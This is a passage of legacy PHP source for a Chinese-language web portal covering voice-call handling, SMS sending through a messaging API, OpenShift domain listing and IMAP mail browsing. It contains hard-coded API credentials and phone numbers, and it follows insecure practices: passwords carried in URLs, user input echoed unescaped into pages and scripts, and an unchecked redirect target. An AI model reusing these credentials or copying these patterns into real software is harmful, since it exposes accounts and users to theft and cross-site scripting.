   <subdialog name="oResult" src="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=phonelimiter&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" namelist="callerid calledid uid" method="post">
      <filled>
            <if cond="oResult.code=='1'">
                        <goto next="<?php echo ScriptPath();?>?api=voxeo&amp;action=voice&amp;act=main&amp;botapikey=vnjk4673fvhn578ghr48hrgfv4h90585" />
            <else/>
            					<prompt xml:lang="zh-CN" >
        								<break time="2s" /><?php  echo formatchar("您好！您暂时无法进入该站点！谢谢！","utf-8");?><break time="500ms" />
      								</prompt>
                      <disconnect/>
            </if>
    </filled>
   </subdialog>
  </form>
</vxml>
<?php 
                                break;
                }       
                break;
        case "sms":  
        				$url = 'http://api.messaging.staging.voxeo.net/1.0/messaging';
								// ToDo: Replace the placeholders in brackets with your data.
								$data="botkey=94491&apimethod=send&msg=".iconv('gb2312','utf-8','['.trim(request('user')).']'.'New essage!')."&user=+8615998963077&network=SMS&from=+12026008419";
								$ch = curl_init();
								curl_setopt($ch, CURLOPT_URL, $url);
								curl_setopt($ch, CURLOPT_HEADER, 0);
								// ToDo: Replace the placeholders in brackets with your data.
								curl_setopt($ch, CURLOPT_USERPWD, 'x3193:EUIfgwe7');
								curl_setopt($ch, CURLOPT_POST, 1);
								curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
								curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
								curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
								$xml = curl_exec($ch);
								if (curl_error($ch)) {
									print "ERROR ". curl_error($ch) ."n<br/>";
								}
								curl_close($ch);
								print_r($xml);        
          
        				$url = 'http://api.messaging.staging.voxeo.net/1.0/messaging';
								// ToDo: Replace the placeholders in brackets with your data.
								$data="botkey=94491&apimethod=send&msg=".iconv('gb2312','utf-8','['.trim(request('user')).']'.trim(request('msg')))."&user=+8615998963077&network=SMS&from=+12026008419";
								$ch = curl_init();
								curl_setopt($ch, CURLOPT_URL, $url);
								curl_setopt($ch, CURLOPT_HEADER, 0);
								// ToDo: Replace the placeholders in brackets with your data.
								curl_setopt($ch, CURLOPT_USERPWD, 'x3193:EUIfgwe7');
								curl_setopt($ch, CURLOPT_POST, 1);
								curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
								curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
								curl_setopt($ch, CURLOPT_TIMEOUT, 100);
								$xml = curl_exec($ch);
								if (curl_error($ch)) {
									print "ERROR ". curl_error($ch) ."n<br/>";
								}
								curl_close($ch);
								print_r($xml);                  
                break;                
        default:
                break;
}
exit;
}
?>


<?php 
function openshift() {
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - IMAP");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        $debug = 1;
}
else{
        $debug = 0;
}

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "domain.list":
                if (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        break;
                                    }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        redirect(scriptpath()."?api=openshift&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("openshift");
}                         

                        $_SESSION["openshift"]=array('uname' => '', 'pwd' => '');                    
                        //session_register("server"); 
                        //$_SESSION["server"] = "";     
                        //session_register("uname"); 
                        //$_SESSION["uname"] = "";      
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = "";        
                        redirect(scriptpath()."?api=openshift&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif ($_SESSION["openshift"]["uname"] != "" && $_SESSION["openshift"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=openshift&skin=".$skincolor."&uname=".encodeuri(trim($_SESSION["openshift"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["openshift"]["pwd"]))."&action=".encodeuri(trim(request("action")))."&page=".encodeuri($page)."&pagesize=".encodeuri($pagesize)."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                elseif (trim(request("uname")) != "" && trim(request("pwd")) != "" && trim($_POST["uname"]) == "" && trim($_POST["pwd"]) == ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("openshift");
} 
                        $_SESSION["openshift"]=array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")));                 
                        //session_register("server"); 
                        //$_SESSION["server"] = trim(request("server"));        
                        //session_register("uname"); 
                        //$_SESSION["uname"] = trim(request("uname"));  
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = trim(request("pwd"));      
                        //redirect(scriptpath()."?api=openshift&skin=".$skincolor."&pagesize=".encodeuri($pagesize)."&page=1&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri(trim(request("action")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        //break;
                }
      
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=openshift&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }  
                $openshift = new openshift_class();
                $domain =  $openshift->openshiftuserdomain($page,$pagesize,base64_Decode($_SESSION["openshift"]["uname"]),base64_Decode($_SESSION["openshift"]["pwd"]));
								//print_r($domain);
                //exit;
                if (is_array($domain)) {
                }       
                else {
                        AlertBack("域名列表输出失败！" , 2);
                        break;
                }
                //return;
                $contents = $domain;              
                if (count($contents['data']) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents['data']);
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=0;
 while(eval('document.openshift.chidd'+i))
 {
  eval('document.openshift.chidd'+i).checked = document.openshift.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.openshift.action='<?php echo httppath()."?api=openshift&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.openshift.submit();
}

function rename(oldName)
{
toname=prompt('将文件 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=openshift&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function renamed(oldName)
{
toname=prompt('将目录 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=openshift&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function encodeuri(str){
        var newstr;
        newstr = encodeURIComponent(str);
        newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
        newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
        newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
        // js replace 的模式无引号（双单），特殊字符需加斜杠，可以单独替换某个字符。
        return(newstr);
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="openshift" method="post" action="">
                <?php 
                $totalitem = count($contents['data']);
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }       
                //echo $endid;          
                ?>
        <tr class="tdtbg">
                <td align="left">&nbsp;云空间管理 -> <a href="<?php echo ScriptPath()."?api=openshift&action=".encodeuri("domain.list")."&uname=".encodeuri(trim(base64_Decode($_SESSION["openshift"]["uname"])))."&pwd=".encodeuri(trim(base64_Decode($_SESSION["openshift"]["pwd"])))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000;"><?php echo trim(base64_decode($_SESSION["openshift"]["uname"]))?></a> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=openshift&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("pwd"))))."&botkey=".encodeuri(trim($botkey))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1"?>" target="_self">退出</a></td>
        </tr>
</table>
                <?php 
                if (count($contents) > $pagesize) $strpagesize = $pagesize; else $strpagesize = count($contents);
                ?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                <?php 
                ?>
                        <tr class="tdbg">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center" width="25%">文件夹</td>
                                <td align="center">容量 - 最新 - 未读</td>
                                <td align="center" width="30%">搜索 创建 删除</td>
                        </tr>
                <?php 
                for($i = $strpagesize*($page-1);$i <= $endid;$i++){
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" /></td>
                                <td align="center"><?php echo "<a style='color:#000000' href='".ScriptPath()."?api=imap&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=&skin=".$skincolor."'>"."*-".$contents['data'][$i]['userid'].".".$contents['data'][$i]['maindomain']."</a>";?></td>
                                <td align="center"><?php echo (($status->messages=="")?"0":$status->messages).' - '.(($status->recent=="")?"0":$status->recent).' - '.(($status->unseen=="")?"0":$status->unseen);?></td>
                                <td align="center">搜索 添加 删除 配额 更名</td>
                        </tr>
                        <?php 
                }
                ?>
                </table>
            </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>下一页</a> ";

                $gotopage = New PageChange();
                $gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "mail.list":
                if ($debug == 1){
                        $mail_count = 1000;
                }
                else{
                        //echo trim(request("mailbox"));
                        $mbox = imap_open("{".base64_decode(trim(request("server"))).":".trim(request("port"))."}".trim(request("mailbox")), base64_decode(trim(request("uname"))), base64_decode(trim(request("pwd"))));
                        $mail_count = imap_num_msg($mbox);
                }
                if ($mail_count > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mail_count;
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=0;
 while(eval('document.ftp.chidd'+i))
 {
  eval('document.ftp.chidd'+i).checked = document.ftp.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.ftp.action='<?php echo httppath()."?api=ftp&skin=".$skincolor."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&server=".trim(request("server"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.remove")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.ftp.submit();
}

function rename(oldName)
{
toname=prompt('将文件 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("file")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function renamed(oldName)
{
toname=prompt('将目录 '+oldName+' 改名为:',oldName);
if(!toname)return;
window.location='<?php echo httppath()."?api=ftp&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&type=".encodeuri("dir")."&port=".trim(request("port"))."&ssl=".trim(request("ssl"))."&pasv=".trim(request("pasv"))."&binary=".trim(request("binary"))."&dir=".encodeuri(trim(request("dir")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&action=".encodeuri("ftp.rename")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&from='+encodeuri(oldName)+'&to='+encodeuri(toname);
}

function encodeuri(str){
        var newstr;
        newstr = encodeURIComponent(str);
        newstr = newstr.replace(/\./g, "<?php echo encodeuri(".")?>", newstr);
        newstr = newstr.replace(/\-/g, "<?php echo encodeuri("-")?>", newstr);
        newstr = newstr.replace(/\_/g, "<?php echo encodeuri("_")?>", newstr);      
        // js replace 的模式无引号（双单），特殊字符需加斜杠，可以单独替换某个字符。
        return(newstr);
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="imap" method="post" action="">
                <?php 
                $totalitem = $mail_count;
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = 0;
                elseif ($totalpage > $page)
                        $endid = floor($mail_count-$strpagesize*($page));
                elseif ($totalpage < $page){
                        $endid = floor($mail_count-$strpagesize*($page-1));
                }       
                //echo $endid;          
                ?>
        <tr class="tdtbg">
                <td align="left">&nbsp;邮箱管理 -> <a href="<?php echo ScriptPath()."?api=imap&action=".encodeuri("mailbox.list")."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")));?>" style="color:#000000;"><?php echo trim(request("servertype"))?>://<?php echo base64_decode(trim(request("uname"))).":".base64_decode(trim(request("pwd")))?>@<?php echo base64_decode(trim(request("server")));?></a> -> <?php echo trim(request("mailbox"))==""?"根目录":mb_convert_encoding(trim(request("mailbox")), "GB2312", "UTF7-IMAP");?></td>
        </tr>
</table>
                <?php 
                if ($mail_count > $pagesize) $strpagesize = $pagesize; else $strpagesize = $mail_count;
                ?>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg"> 
            <td valign="top"> 
                <table width="100%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">

                        <tr class="tdbg">
                                <td align="center" width="3%"><input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" /></td>
                                <td align="center">标题</td>
                                <td align="center" width="25%">发件人</td>
                                <td align="center" width="30%">搜索 创建 删除</td>
                        </tr>
                <?php 
                $i = 0;
                for($i=$mail_count-$strpagesize*($page-1);$i>$endid;$i--){
                
                        if ($debug == 1){
                                $mail_subject = array('0' => array('charset' => 'gb2312','text' => '东亚银行系统升级公告'));
                                $mailsubject = "";
                                for($j=0;$j<count($mail_subject);$j++){
                                        if($j!=count($mail_subject)-1){
                                                $mailsubject = (strtolower($mail_subject[$j]['charset'])!=='default'?iconv($mail_subject[$j]['charset'],"gb2312",$mail_subject[$j]['text']):$mail_subject[$j]['text'])." - ";
                                        }       
                                        else{
                                                $mailsubject = $mailsubject.(strtolower($mail_subject[$j]['charset'])!=='default'?iconv($mail_subject[$j]['charset'],"gb2312",$mail_subject[$j]['text']):$mail_subject[$j]['text']);
                                        }
                                }
                        }
                        else{
                                $list = imap_headerinfo($mbox,$i,1024,1024);//发件人字符长度，主题字符长度
                                $mail_subject = imap_mime_header_decode($list->fetchsubject);
                                //print_r($mail_subject);
                                //return;
                                $mailsubject = "";
                                for($j=0;$j<count($mail_subject);$j++){
                                        //echo $mail_subject[$j]->charset;
                                        $mailsubject = $mailsubject.((strtolower($mail_subject[$j]->charset)!='default'&&strtoupper($mail_subject[$j]->charset)!='EUC_CN')?iconv(strtolower($mail_subject[$j]->charset),"gb2312",$mail_subject[$j]->text):$mail_subject[$j]->text);
                                }       

                                $mail_from = imap_mime_header_decode($list->fetchfrom);
                                $mailfrom = "";
                                for($j=0;$j<count($mail_from);$j++){
                                        $mailfrom = $mailfrom.((strtolower($mail_from[$j]->charset)!=='default'&&strtoupper($mail_subject[$j]->charset)!='EUC_CN')?iconv(strtolower($mail_from[$j]->charset),"gb2312",$mail_from[$j]->text):$mail_from[$j]->text);
                                }                               
                        }                       
                        ?>
                        <tr class="tdbg">
                                <td align="center"><input type="checkbox" name="chidd<?php echo $cMaxDir;?>" id="chidd<?php echo $cMaxDir;?>" value="<?php echo $i;?>" /></td>
                                <td align="center"><?php echo "<a style='color:#000000' href='".ScriptPath()."?api=imap&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailnum=".$i."&mailbox=".encodeuri(trim(request("mailbox")))."'>".$mailsubject."</a>";?></td>
                                <td align="center"><?php echo $mailfrom;?></td>
                                <td align="center">搜索 添加 删除 配额 更名</td>
                        </tr>
                        <?php 
                }
                if ($debug == 1){
                }
                else{
                        imap_close($mbox);              
                }                       
                ?>
                </table>
            </td>
        </tr>           
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&mailbox=".encodeuri(trim(request("mailbox")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."'>下一页</a> ";

                $gotopage = New PageChange();
                $gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                $gotopage->gotopage($totalpage,ScriptPath()."?api=imap&action=".encodeuri(trim(request("action")))."&server=".encodeuri(trim(request("server")))."&port=".trim(request("port"))."&servertype=".trim(request("servertype"))."&mailbox=".encodeuri(trim(request("mailbox")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "robot.modify":
                break;
        case "robot.remove":
                break;
        case "robot.status":
                break;
        case "msg.create":
                break;
        case "msg.send":
                break;
        case "msg.qun.send":
                break;
        default:
                    if ($_SESSION["openshift"]["uname"] != "" && $_SESSION["openshift"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                        if (trim(request("api")) == "openshift"){
                        ?>
                                <?php  redirect(ScriptPath()."?api=".trim(request("api"))."&action=".encodeuri('domain.list')."&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));?>
                        <?php 
                        }
                     }          
        
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="openshift">
                        <form action="<?php echo ScriptPath();?>?api=openshift&action=<?php echo encodeuri("domain.list");?>&skin=<?php  echo $skincolor;?>&c=<?php echo encodeuri(trim(request("c")))?>&t=<?php echo encodeuri(trim(request("t")))?>&u=<?php echo encodeuri(trim(request("u")))?>" method="post" name="google">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>> 
                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
}
$style->footer();               
}
?>


<?php 
function imap() {
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - IMAP");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
        $debug = 1;
}
else{
        $debug = 0;
}

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "mailbox.list":
                if (trim(request("server")) == "" || trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        if (trim($_POST["server"]) == "" || trim($_POST["uname"]) == "" || trim($_POST["pwd"]) == ""){
                                AlertBack("服务器名、用户名或密码为空！" , 1);
                                break;
                        }
                        else{
                                AlertBack("服务器名、用户名或密码为空！" , 2);
                                break;
                        }
                }
